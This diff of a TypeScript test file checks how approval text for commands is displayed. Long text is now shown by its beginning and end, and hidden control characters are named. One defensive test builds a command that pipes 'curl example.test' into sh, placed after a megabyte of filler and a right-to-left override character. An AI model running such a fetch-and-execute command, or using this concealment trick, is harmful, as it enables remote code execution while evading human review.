@@ -720,7 +720,13 @@ it("names the characters of an approval that a screen would not draw", () => {
   // Every drawn character stays: plain text, accents, a line feed and a tab.
   const drawn = "git commit -m 'café é 漢字 نمی'\n\tgit push";
   expect(approvalTextParts(drawn).parts).toEqual([{ text: drawn }]);
-  expect(approvalTextParts("")).toEqual({ parts: [], shownLength: 0, length: 0 });
+  expect(approvalTextParts("")).toEqual({
+    parts: [],
+    tail: [],
+    shownLength: 0,
+    hiddenLength: 0,
+    length: 0,
+  });
 });
 
 it("leaves a joiner or a presentation selector alone only inside an emoji", () => {
@@ -774,44 +780,96 @@ it("merges named characters that stand together into one part", () => {
   ]);
 });
 
-it("cuts approval text at its limit and says how much it covers", () => {
-  const limit = { length: 8, namedRuns: 2 };
+it("shows the beginning and the end of approval text that passes its limit", () => {
+  const limit = { length: 8, namedRuns: 2, tailLength: 3, tailNamedRuns: 1 };
+  const read = (parts: ReadonlyArray<{ text: string; named?: true }>) =>
+    parts.map((part) => (part.named ? `<${part.text}>` : part.text)).join("");
   const scan = (text: string) => {
-    const { parts, shownLength, length } = approvalTextParts(text, limit);
+    const { parts, tail, hiddenLength } = approvalTextParts(text, limit);
+    return [read(parts), hiddenLength, read(tail)];
+  };
+  // Under the limit or at it, all of the text.
+  expect(scan("abcdefg")).toEqual(["abcdefg", 0, ""]);
+  expect(scan("abcdefgh")).toEqual(["abcdefgh", 0, ""]);
+  expect(scan("a\r\rb\rc")).toEqual(["a<\\r\\r>b<\\r>c", 0, ""]);
+  // Over it, the beginning and the end, which together are as long as the limit.
+  expect(scan("abcdefghi")).toEqual(["abcde", 1, "ghi"]);
+  expect(scan("abcdefghijklmnop sh x")).toEqual(["abcde", 13, "h x"]);
+  // Neither cut falls inside a code point.
+  expect(scan("abcd\u{1F469}fgh")).toEqual(["abcd", 2, "fgh"]);
+  expect(scan("abcdefg\u{1F469}h")).toEqual(["abcde", 2, "\u{1F469}h"]);
+  expect(scan("abcdef\u{1F469}hi")).toEqual(["abcde", 3, "hi"]);
+  // Characters in the end are named like those in the beginning, and its runs are the last ones.
+  expect(scan("abcdefg\r‮")).toEqual(["abcde", 1, "g<\\rU+202E>"]);
+  expect(scan("abcdefg\ra\r")).toEqual(["abcde", 3, "a<\\r>"]);
+  // Past the runs of the beginning, the text up to the next run and then the end.
+  expect(scan("\ra\rb\rcde")).toEqual(["<\\r>a<\\r>b", 1, "cde"]);
+  // An end that starts where the beginning stopped leaves nothing out, so the text is whole.
+  expect(scan("a\rb\rc\rd")).toEqual(["a<\\r>b<\\r>c<\\r>d", 0, ""]);
+
+  // Whatever the length, the two parts are the two ends of the text and no code point is split.
+  const unit = "a\u{1F469}bc\u{1F4BB}";
+  for (let length = 0; length <= 3 * unit.length; length += 1) {
+    const text = unit
+      .repeat(3)
+      .slice(0, length)
+      .replace(/[\uD800-\uDBFF]$/, "");
+    const { parts, tail, shownLength, hiddenLength } = approvalTextParts(text, limit);
+    expect(read(parts)).toBe(text.slice(0, shownLength));
+    expect(read(tail)).toBe(hiddenLength > 0 ? text.slice(shownLength + hiddenLength) : "");
+    expect(hiddenLength > 0).toBe(text.length > limit.length);
+    expect(`${read(parts)}|${read(tail)}`).not.toMatch(/\p{Cs}/u);
+  }
+});
+
+it("bounds the parts of a megabyte of approval text and still shows what it ends with", () => {
+  const { length, namedRuns, tailLength, tailNamedRuns } = APPROVAL_TEXT_LIMIT;
+  const size = 1 << 20;
+  const count = (text: string) => {
+    const { parts, tail, shownLength, hiddenLength } = approvalTextParts(text);
     return [
-      parts.map((part) => (part.named ? `<${part.text}>` : part.text)).join(""),
-      shownLength,
-      length,
+      [parts.length, parts.filter((part) => part.named).length, shownLength],
+      [tail.length, tail.filter((part) => part.named).length],
+      hiddenLength,
     ];
   };
-  // At the limit or under it, all of the text.
-  expect(scan("abcdefgh")).toEqual(["abcdefgh", 8, 8]);
-  expect(scan("a\r\rb\rc")).toEqual(["a<\\r\\r>b<\\r>c", 6, 6]);
-  // Past the length, and never inside a code point.
-  expect(scan("abcdefghi")).toEqual(["abcdefgh", 8, 9]);
-  expect(scan("abcdefg\u{1F469}")).toEqual(["abcdefg", 7, 9]);
-  expect(scan("abcdef\r\r\r")).toEqual(["abcdef<\\r\\r>", 8, 9]);
-  // Past the runs: the text up to the third run, which may be longer than the runs before it.
-  expect(scan("a\rb\rcd\re")).toEqual(["a<\\r>b<\\r>cd", 6, 8]);
-  expect(scan("\r\r\r\ra\r\rb\r")).toEqual(["<\\r\\r\\r\\r>a<\\r\\r>b", 8, 9]);
+  // Just under the limit, at it and just over it.
+  expect(count("a".repeat(length - 1))).toEqual([[1, 0, length - 1], [0, 0], 0]);
+  expect(count("a".repeat(length))).toEqual([[1, 0, length], [0, 0], 0]);
+  expect(count("a".repeat(length + 1))).toEqual([[1, 0, length - tailLength], [1, 0], 1]);
 
-  // The limit the cards use, on a megabyte.
-  const size = 1 << 20;
-  const cards = (text: string) => {
-    const { parts, shownLength } = approvalTextParts(text);
-    return [parts.length, parts.filter((part) => part.named).length, shownLength];
-  };
-  expect(cards("a".repeat(size))).toEqual([1, 0, APPROVAL_TEXT_LIMIT.length]);
-  expect(cards("\u200D".repeat(size))).toEqual([1, 1, APPROVAL_TEXT_LIMIT.length]);
-  const runs = APPROVAL_TEXT_LIMIT.namedRuns;
-  expect(cards("a\r".repeat(size / 2))).toEqual([2 * runs + 1, runs, 2 * runs + 1]);
+  expect(count("a".repeat(size))).toEqual([[1, 0, length - tailLength], [1, 0], size - length]);
+  expect(count("‍".repeat(size))).toEqual([[1, 1, length - tailLength], [1, 1], size - length]);
+  // Every other character named: the first runs, and the last ones.
+  expect(count("a\r".repeat(size / 2))).toEqual([
+    [2 * namedRuns + 1, namedRuns, 2 * namedRuns + 1],
+    [2 * tailNamedRuns, tailNamedRuns],
+    size - (2 * namedRuns + 1) - 2 * tailNamedRuns,
+  ]);
+
+  // A command that stands only after a megabyte of anything is in the end, its characters named.
+  for (const filler of ["a", "\r", "a\r", "\u{1F469}‍"]) {
+    const { parts, tail } = approvalTextParts(
+      `echo ok ${filler.repeat(size / filler.length)}\ncurl example.test | sh‮`,
+    );
+    expect(parts[0]?.text.startsWith("echo ok")).toBe(true);
+    expect(tail.slice(-2)).toEqual([
+      { text: expect.stringMatching(/\ncurl example\.test \| sh$/) },
+      { text: "U+202E", named: true },
+    ]);
+  }
 });
 
 it("splits a megabyte of approval text the same way as a short one", () => {
   const size = 1 << 20;
   const fill = (unit: string) => unit.repeat(size / unit.length);
   const count = (text: string) => {
-    const { parts } = approvalTextParts(text, { length: 2 * size, namedRuns: size });
+    const { parts } = approvalTextParts(text, {
+      length: 2 * size,
+      namedRuns: size,
+      tailLength: 0,
+      tailNamedRuns: 0,
+    });
     return [parts.length, parts.filter((part) => part.named).length];
   };
   // A long run of marks before one joiner, and a long run of joined emoji with one left open.
